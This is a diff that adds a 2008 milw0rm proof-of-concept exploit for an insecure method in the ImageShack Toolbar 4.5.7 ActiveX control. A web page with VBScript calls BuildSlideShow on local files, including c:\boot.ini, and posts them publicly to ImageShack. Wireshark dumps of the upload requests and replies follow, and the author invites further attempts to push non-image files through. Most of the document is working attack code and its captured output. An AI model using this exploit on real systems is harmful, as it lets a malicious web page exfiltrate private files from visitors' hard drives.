@@ -1,0 +1,202 @@
+<!--
+ImageShack Toolbar 4.5.7 FileUploader Class (ImageShackToolbar.dll) insecure
+method poc
+
+This tool may allow a malicious web page to post arbitrary images on the web
+from a user hard drive. Images will be visible on ImageShack site, a way for an
+attacker to retrieve them maybe tag search or by understanding the renaming
+operation, ex. "_" chars are removed and the "tq2" string is appended.
+My test image is still visible here:
+http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg
+Note that a file with a non-image extension can cross the network, Imageshack
+server replies with an error message, however this needs further investigation
+that I let you to do, ex. with custom packet fields injection.
+
+I suggest users to uninstall it temporarily an just use the site functionalities
+
+Object safety report:
+
+RegKey Safe for Script: True
+RegKey Safe for Init: True
+Implements IObjectSafety: True
+IDisp Safe:  Safe for untrusted: caller
+
+rgod-tsid-pa-he-ru-ka
+-
+stay tuned with us ...
+http://retrogod.altervista.org/join.html
+security feeds, radio streams, techno/drum & bass stations to come
+-->
+
+<html>
+<body>
+<object classid='clsid:BDF9442E-9B03-42C2-87BA-2A459B0A5317' id='suntzu' /></object>
+<script language='vbscript'>
+suntzu.BuildSlideShow "file:///c:\\xp_wallpaper_glass.jpg","Big",1,"uhuhinterestingprivatethings","Fade","White"
+suntzu.BuildSlideShow "file:///c:\\boot.ini", "Big",1,"uhuhinterestingprivatethings","Fade","White"
+</script>
+</body>
+</html>
+
+----
+
+some wireshark's dump samples:
+
+POST /upload_api.php HTTP/1.1
+Content-Type: multipart/form-data, boundary=B-O-U-N-D-A-R-Y731553141
+Content-Length: 21755
+User-Agent: ImageShack Toolbar 4.5.7 ([..])
+Host: load9.imageshack.us
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: imgshck=[..]; un_cookie=1; latest=img404; flashInstalled=9.0; __qca=[..]; rem_bar=1; nopopunder=1
+
+--B-O-U-N-D-A-R-Y731553141
+Content-Disposition: form-data; name="toolbar"
+
+IEImageShackToolbar-4.5.7.69
+--B-O-U-N-D-A-R-Y731553141
+Content-Disposition: form-data; name="public"
+
+yes
+--B-O-U-N-D-A-R-Y731553141
+Content-Disposition: form-data; name="xml"
+
+newformat
+--B-O-U-N-D-A-R-Y731553141
+Content-Disposition: form-data; name="tags"
+
+uhuhinterestingprivatethings
+--B-O-U-N-D-A-R-Y731553141
+Content-Disposition: form-data; name="rembar"
+
+1
+--B-O-U-N-D-A-R-Y731553141
+Content-Disposition: form-data; name="fileupload"; filename="xp_wallpaper_glass.jpg"
+Content-Type: image/jpeg
+Content-Transfer-Encoding: binary
+
+[file content]
+--B-O-U-N-D-A-R-Y731553141
+Content-Disposition: form-data; name="thumbupload"; filename="xp_wallpaper_glass6fa1f1.jpg"
+Content-Type: image/jpeg
+Content-Transfer-Encoding: binary
+
+[file content]
+--B-O-U-N-D-A-R-Y731553141
+Content-Disposition: form-data; name="class"
+
+s
+--B-O-U-N-D-A-R-Y731553141--
+
+
+reply:
+
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+X-Powered-By: PHP/5.1.2
+Set-Cookie: latest=img262; expires=Sun, 18-Jan-2009 07:56:24 GMT; path=/; domain=.imageshack.us
+Set-Cookie: PHPSESSID=[..]; path=/
+Set-Cookie: always_opt=-1; path=/; domain=.imageshack.us
+Set-Cookie: rem_bar=1; expires=Sun, 18-Jan-2009 07:56:24 GMT; path=/; domain=.imageshack.us
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Content-type: text/xml
+Pragma: public
+Cache-Control: must-revalidate, post-check=0, pre-check=0
+Date: Thu, 24 Jan 2008 07:56:25 GMT
+Server: lighttpd/1.4.8
+
+<?xml version="1.0" encoding="iso-8859-1"?><imginfo xmlns="http//ns.imageshack.us/imginfo/6/" version="6" timestamp="1201161385">
+  <rating>
+    <ratings>0</ratings>
+    <avg>0.0</avg>
+  </rating>
+  <files server="262" bucket="7959">
+     <image size="16646" content-type="image/jpeg">xpwallpaperglasstq2.jpg</image>
+     <thumb size="3155" content-type="image/jpeg">xpwallpaperglasstq2.th.jpg</thumb>
+  </files>
+  <resolution>
+    <width>426</width>
+    <height>320</height>
+  </resolution>
+  <class>s</class>
+  <uploader>
+    <ip>87.11.97.155</ip>
+  </uploader>
+  <links>
+    <image_link>http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.jpg</image_link>
+    <image_html>&lt;a href=&quot;http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.jpg&quot; alt=&quot;Free Image Hosting at www.ImageShack.us&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;</image_html>
+    <image_bb>[URL=http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg][IMG]http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.jpg[/IMG][/URL]</image_bb>
+    <image_bb2>[url=http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg][img=http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.jpg][/url]</image_bb2>
+    <thumb_link>http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.th.jpg</thumb_link>
+    <thumb_html>&lt;a href=&quot;http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.th.jpg&quot; alt=&quot;Free Image Hosting at www.ImageShack.us&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;</thumb_html>
+    <thumb_bb>[URL=http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg][IMG]http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.th.jpg[/IMG][/URL]</thumb_bb>
+    <thumb_bb2>[url=http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg][img=http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.th.jpg][/url]</thumb_bb2>
+    <ad_link>http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg</ad_link>
+    <done_page>http://img262.imageshack.us/content.php?page=done&amp;l=img262/7959/xpwallpaperglasstq2.jpg</done_page>
+  </links>
+</imginfo>
+
+with the boot.ini file:
+
+POST /upload_api.php HTTP/1.1
+Content-Type: multipart/form-data, boundary=B-O-U-N-D-A-R-Y732118720442
+Content-Length: 1077
+User-Agent: ImageShack Toolbar 4.5.7 (WinNT 5.1 Service Pack 2)
+Host: load10.imageshack.us
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: imgshck=[..]; un_cookie=1; latest=img214; flashInstalled=9.0; __qca=[..]; rem_bar=1; nopopunder=1; always_opt=-1
+
+--B-O-U-N-D-A-R-Y732118720442
+Content-Disposition: form-data; name="toolbar"
+
+IEImageShackToolbar-4.5.7.69
+--B-O-U-N-D-A-R-Y732118720442
+Content-Disposition: form-data; name="public"
+
+yes
+--B-O-U-N-D-A-R-Y732118720442
+Content-Disposition: form-data; name="xml"
+
+newformat
+--B-O-U-N-D-A-R-Y732118720442
+Content-Disposition: form-data; name="tags"
+
+uhuhinterestingprivatethings
+--B-O-U-N-D-A-R-Y732118720442
+Content-Disposition: form-data; name="rembar"
+
+1
+--B-O-U-N-D-A-R-Y732118720442
+Content-Disposition: form-data; name="fileupload"; filename="boot.ini"
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: binary
+
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Home Edition" / fastdetect /NoExecute=OptIn
+--B-O-U-N-D-A-R-Y732118720442
+Content-Disposition: form-data; name="class"
+
+s
+--B-O-U-N-D-A-R-Y732118720442--
+
+reply:
+
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+X-Powered-By: PHP/5.1.2
+Content-Type: text/xml
+Set-Cookie: latest=img89; expires=Sun, 18-Jan-2009 07:56:28 GMT; path=/; domain=.imageshack.us
+Date: Thu, 24 Jan 2008 07:56:28 GMT
+Server: lighttpd/1.4.18
+
+<links>
+<error id="wrong_file_type">Wrong file type detected for file boot.ini:application/octet-stream</error>
+</links>
+
+# milw0rm.com [2008-01-24]
